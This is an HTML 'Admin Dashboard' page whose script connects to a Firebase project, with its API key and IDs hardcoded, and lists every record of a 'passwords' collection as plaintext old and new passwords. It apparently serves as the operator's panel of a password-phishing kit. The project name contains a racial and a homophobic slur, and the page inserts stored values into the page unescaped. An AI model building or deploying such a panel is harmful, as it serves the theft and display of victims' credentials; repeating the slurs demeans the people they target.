<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      margin: 0;
      padding: 0;
    }
    .header {
      background-color: #007BFF;
      color: white;
      padding: 20px;
      text-align: center;
    }
    .container {
      margin: 20px auto;
      width: 90%;
      max-width: 1200px;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    h1 {
      margin-bottom: 20px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 12px;
      border: 1px solid #ddd;
      text-align: left;
    }
    th {
      background-color: #007BFF;
      color: white;
    }
    .action-btns button {
      margin-right: 10px;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>Admin Dashboard</h1>
  </div>
  <div class="container">
    <h2>User Details</h2>
    <table>
      <thead>
        <tr>
          <th>ID</th>
          <th>Old Password</th>
          <th>New Password</th>
        </tr>
      </thead>
      <tbody id="userTable">
        <!-- Dynamic data will be inserted here -->
      </tbody>
    </table>
  </div>

  <script type="module">
    // Import Firebase modules
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
    import { getFirestore, collection, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';

    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
      authDomain: "gay-ass-nigga.firebaseapp.com",
      databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
      projectId: "gay-ass-nigga",
      storageBucket: "gay-ass-nigga.appspot.com",
      messagingSenderId: "740449529935",
      appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Fetch and display user data
    const userTable = document.getElementById('userTable');

    async function loadUserData() {
      try {
        const querySnapshot = await getDocs(collection(db, 'passwords'));
        querySnapshot.forEach((doc) => {
          const data = doc.data();
          const row = `
            <tr>
              <td>${doc.id}</td>
              <td>${data.oldPassword}</td>
              <td>${data.newPassword}</td>
            </tr>
          `;
          userTable.insertAdjacentHTML('beforeend', row);
        });
      } catch (error) {
        console.error("Error loading user data:", error);
      }
    }

    // Load user data on page load
    loadUserData();
  </script>
</body>
</html>
